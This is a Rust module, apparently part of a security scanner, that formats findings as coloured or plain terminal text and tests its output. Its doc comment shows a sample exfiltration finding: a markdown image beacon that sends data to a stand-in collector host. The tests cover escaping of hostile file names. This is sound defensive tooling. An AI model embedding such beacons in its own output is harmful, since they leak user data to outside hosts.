//! Human-readable text: findings grouped by file, each with its location,
//! severity, rule and title, the escaped snippet, any detail the detector
//! added, and the rule's remediation the first time the rule appears. A
//! summary line ends the report.
//!
//! ```text
//! docs/a.md (2 findings)
//!   docs/a.md:1:3  HIGH     exfiltration/markdown-image-beacon  Markdown image ...
//!       ![x](https://collector.example/p.png?d=1)
//!       fix: Remove the image, ...
//!
//! 2 findings (2 high) in 14 files scanned.
//! ```
//!
//! Colour is the caller's decision ([`colour_for_stdout`]); with it off the
//! output contains no escape sequences at all.

use std::collections::{BTreeMap, HashMap, HashSet};
use std::ffi::OsStr;
use std::fmt::Write as _;
use std::io::IsTerminal;

use crate::report::{Finding, Report, Severity};
use crate::rule::Rule;
use crate::text::escape_for_display;

/// Should text output be coloured? Only when stdout is a terminal and
/// `NO_COLOR` is unset (<https://no-color.org>).
pub fn colour_for_stdout() -> bool {
    should_colour(
        std::io::stdout().is_terminal(),
        std::env::var_os("NO_COLOR").as_deref(),
    )
}

/// The colour decision with its inputs made explicit, for tests.
pub fn should_colour(stdout_is_terminal: bool, no_color: Option<&OsStr>) -> bool {
    stdout_is_terminal && no_color.is_none()
}

struct Paint {
    on: bool,
}

impl Paint {
    fn wrap(&self, code: &str, text: &str) -> String {
        if self.on {
            format!("\x1b[{code}m{text}\x1b[0m")
        } else {
            text.to_owned()
        }
    }

    fn severity(&self, sev: Severity) -> String {
        // Padded before painting so columns line up with colour on or off.
        let label = format!("{:<8}", sev.as_str().to_ascii_uppercase());
        let code = match sev {
            Severity::Critical => "1;35",
            Severity::High => "1;31",
            Severity::Medium => "33",
            Severity::Low => "36",
            Severity::Info => "2",
        };
        self.wrap(code, &label)
    }
}

/// Render `report` as text. `rules` supply remediations; `colour` adds ANSI
/// colour (decide with [`colour_for_stdout`]).
pub fn render(report: &Report, rules: &[Rule], colour: bool) -> String {
    let paint = Paint { on: colour };
    let by_id: HashMap<&str, &Rule> = rules.iter().map(|r| (r.id(), r)).collect();
    let mut remediated: HashSet<&str> = HashSet::new();
    let mut out = String::new();

    for group in report.findings.chunk_by(|a, b| a.path == b.path) {
        let path = escape_for_display(&group[0].path);
        let count = match group.len() {
            1 => "1 finding".to_owned(),
            n => format!("{n} findings"),
        };
        let _ = writeln!(out, "{} ({count})", paint.wrap("1", &path));
        for f in group {
            finding(&mut out, &paint, &path, f);
            if remediated.insert(f.rule_id.as_str()) {
                if let Some(rule) = by_id.get(f.rule_id.as_str()) {
                    let fix = one_line(rule.remediation());
                    let _ = writeln!(out, "      {} {fix}", paint.wrap("32", "fix:"));
                }
            }
        }
        out.push('\n');
    }

    if !report.errors.is_empty() {
        let _ = writeln!(
            out,
            "{}",
            paint.wrap("1", "Errors (these files were not fully scanned):")
        );
        for e in &report.errors {
            // Messages are escaped by the engine; paths are not.
            let _ = writeln!(out, "  {}: {}", escape_for_display(&e.path), e.message);
        }
        out.push('\n');
    }

    out.push_str(&summary_line(report));
    out.push('\n');
    out
}

fn finding(out: &mut String, paint: &Paint, path: &str, f: &Finding) {
    let _ = writeln!(
        out,
        "  {}:{}:{}  {} {}  {}",
        path,
        f.start.line,
        f.start.column,
        paint.severity(f.severity),
        escape_for_display(&f.rule_id),
        escape_for_display(&f.title)
    );
    for line in f.snippet.lines() {
        let _ = writeln!(out, "      {}", paint.wrap("2", line));
    }
    // The message is "<title>: <detail>" when the detector added detail
    // (decoded tag text, the trigger and token of a workflow, ...). Escaping
    // is idempotent, so text the engine already escaped is unchanged.
    let detail = f
        .message
        .strip_prefix(f.title.as_str())
        .and_then(|rest| rest.strip_prefix(": "))
        .or((f.message != f.title).then_some(f.message.as_str()));
    if let Some(detail) = detail {
        let _ = writeln!(
            out,
            "      {} {}",
            paint.wrap("36", "detail:"),
            escape_for_display(detail)
        );
    }
}

/// Collapse whitespace so a folded YAML remediation prints as one line.
fn one_line(s: &str) -> String {
    escape_for_display(&s.split_whitespace().collect::<Vec<_>>().join(" "))
}

fn plural(n: usize, one: &str, many: &str) -> String {
    if n == 1 {
        format!("1 {one}")
    } else {
        format!("{n} {many}")
    }
}

/// `3 findings (1 critical, 2 high) in 12 files scanned; 2 skipped
/// (symlink 1, too-large 1), 1 error.`
fn summary_line(report: &Report) -> String {
    let s = report.summary();
    let mut line = if s.findings == 0 {
        "No findings".to_owned()
    } else {
        let by = s.by_severity;
        let parts: Vec<String> = [
            (by.critical, "critical"),
            (by.high, "high"),
            (by.medium, "medium"),
            (by.low, "low"),
            (by.info, "info"),
        ]
        .into_iter()
        .filter(|(n, _)| *n > 0)
        .map(|(n, name)| format!("{n} {name}"))
        .collect();
        format!(
            "{} ({})",
            plural(s.findings, "finding", "findings"),
            parts.join(", ")
        )
    };
    let _ = write!(
        line,
        " in {} scanned",
        plural(s.files_scanned, "file", "files")
    );
    let mut tail = Vec::new();
    if !report.skipped.is_empty() {
        let mut reasons: BTreeMap<&str, usize> = BTreeMap::new();
        for sk in &report.skipped {
            *reasons.entry(sk.reason.as_str()).or_default() += 1;
        }
        let reasons: Vec<String> = reasons.iter().map(|(r, n)| format!("{r} {n}")).collect();
        tail.push(format!(
            "{} skipped ({})",
            report.skipped.len(),
            reasons.join(", ")
        ));
    }
    if !report.errors.is_empty() {
        tail.push(plural(report.errors.len(), "error", "errors"));
    }
    if report.truncated {
        tail.push("the walk stopped at a file-count or depth limit".to_owned());
    }
    if !tail.is_empty() {
        line.push_str("; ");
        line.push_str(&tail.join(", "));
    }
    line.push('.');
    line
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::output::tests::sample;
    use crate::report::{SkipReason, Skipped};

    #[test]
    fn groups_by_file_with_snippet_and_remediation_once() {
        let (rules, mut report) = sample();
        // A second finding of t/high in another file: no second remediation.
        let mut again = report.findings[0].clone();
        again.path = "z.md".into();
        report.findings.push(again);
        let out = render(&report, &rules, false);
        let expected_head = "docs/a.md (2 findings)\n  \
            docs/a.md:1:3  HIGH     t/high  Title of t/high\n      \
            a needle\n      fix: Fix t/high.\n  \
            docs/a.md:2:7  INFO     t/info  Title of t/info\n      \
            and a pin\n      fix: Fix t/info.\n\n";
        assert!(out.starts_with(expected_head), "{out}");
        assert_eq!(out.matches("fix: Fix t/high.").count(), 1, "{out}");
        assert!(out.contains("z.md (1 finding)\n  z.md:1:3  HIGH     t/high"));
        assert!(out.contains("Errors (these files were not fully scanned):\n  bad.json: JSON parse error at line 1\n"));
        assert!(
            out.ends_with(
                "4 findings (1 critical, 2 high, 1 info) in 4 files scanned; \
                 1 skipped (excluded-dir 1), 1 error.\n"
            ),
            "{out}"
        );
    }

    #[test]
    fn hostile_paths_and_snippets_cannot_drive_the_terminal() {
        let (rules, report) = sample();
        let out = render(&report, &rules, false);
        assert!(!out.contains('\u{1b}'), "{out:?}");
        assert!(!out.contains('\u{202E}'));
        assert!(
            out.contains("we\\u{001B}[31mird name.txt (1 finding)"),
            "{out}"
        );
        assert!(out.contains("danger \\u{202E}x"), "{out}");
        assert!(out.contains("CRITICAL t/crit  Title of t/crit"));
    }

    #[test]
    fn colour_only_when_asked() {
        let (rules, report) = sample();
        let plain = render(&report, &rules, false);
        let coloured = render(&report, &rules, true);
        assert!(
            coloured.contains("\x1b[1;31mHIGH    \x1b[0m"),
            "{coloured:?}"
        );
        assert!(coloured.contains("\x1b[1;35mCRITICAL\x1b[0m"));
        // Stripping the escapes gives back the plain text.
        let stripped = regex::Regex::new("\x1b\\[[0-9;]*m")
            .unwrap()
            .replace_all(&coloured, "");
        assert_eq!(stripped, plain);
    }

    #[test]
    fn colour_decision() {
        assert!(should_colour(true, None));
        assert!(!should_colour(false, None));
        assert!(!should_colour(true, Some(OsStr::new("1"))));
        // NO_COLOR set to anything, even empty, turns colour off.
        assert!(!should_colour(true, Some(OsStr::new(""))));
    }

    #[test]
    fn details_and_summaries() {
        let (rules, mut report) = sample();
        report.findings.truncate(1);
        report.findings[0].message = "Title of t/high: decoded \"run curl\"".into();
        report.errors.clear();
        report.skipped.push(Skipped {
            path: "l".into(),
            reason: SkipReason::Symlink,
        });
        report.truncated = true;
        let out = render(&report, &rules, false);
        assert!(
            out.contains("      detail: decoded \"run curl\"\n"),
            "{out}"
        );
        assert!(
            out.ends_with(
                "1 finding (1 high) in 4 files scanned; 2 skipped (excluded-dir 1, symlink 1), \
             the walk stopped at a file-count or depth limit.\n"
            ),
            "{out}"
        );
        let empty = Report {
            files_scanned: 1,
            ..Report::default()
        };
        assert_eq!(
            render(&empty, &rules, true),
            "No findings in 1 file scanned.\n"
        );
    }
}
